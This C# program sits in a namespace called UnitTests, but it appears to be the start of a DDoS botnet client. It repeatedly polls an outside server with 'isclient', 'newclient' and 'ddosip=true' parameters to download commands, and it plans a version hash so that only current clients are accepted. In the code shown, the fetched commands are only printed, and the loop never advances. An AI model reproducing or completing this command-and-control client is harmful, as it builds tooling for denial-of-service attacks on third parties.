using System;
using System.Net;

namespace UnitTests
{
    class Program
    {
        static void Main(string[] args)
        {
            // Setting server adress
            string ServerAddress = "http://cutenesss.xyz/server.php";

            WebClient client = new WebClient();

            string Secret = "<3"; //A string to use as the version ID. Use it for testing the client.
            

            //In future versions, this hash will be secret and enforced - Makes sure everyone is running latest client
            int GetIterations = -1;
            string target = "";
            bool Loop = true; // So we can break the loop
            Console.WriteLine("Set varibles - No errors");
            while (Loop)
            {
                if (GetIterations == -1 || (target != "" && GetIterations > 9) || target == "")
                {
                    //Log("Asking the server for commands");
                    string paramaters = "?";

                    //Tells the server that this is a client, and not a web browser
                    if (paramaters == "?")
                        paramaters = paramaters + "isclient=true";
                    else
                        paramaters = paramaters + "&isclient=true";

                    //Analytical: Tells server this is a new client
                    //(Will probably be implemented in a newer version)
                    if (GetIterations == -1)
                    {
                        //Telling the server this is a new client
                        if (paramaters == "?")
                            paramaters = paramaters + "newclient=true";
                        else
                            paramaters = paramaters + "&newclient=true";
                    }
                    else
                    {
                        if (paramaters == "?")
                            paramaters = paramaters + "newclient=false";
                        else
                            paramaters = paramaters + "&newclient=false";
                    }

                    if (paramaters == "?")
                        paramaters = paramaters + "ddosip=true";
                    else
                        paramaters = paramaters + "&ddosip=true";

                    //Tells the server the security hash for this version.
                    /*
                    if (paramaters == "?")
                        paramaters = paramaters + "hash=" + Hash;
                    else
                        paramaters = paramaters + "&hash=" + Hash;
                        */
                    //Tells the server the client hash of this version. This will be used to protect the server from clients impersonating.

                    string commands = "";
                    try
                    {
                        commands = client.DownloadString(ServerAddress + paramaters);
                    }
                    catch (WebException web)
                    {Console.WriteLine(web);}//TODO: Handle this Exception.

                    //string comtrim = commands.Trim();
                    Console.WriteLine(commands);
                    Console.ReadKey();
                    

                          
                }
            }
        }
    }
}
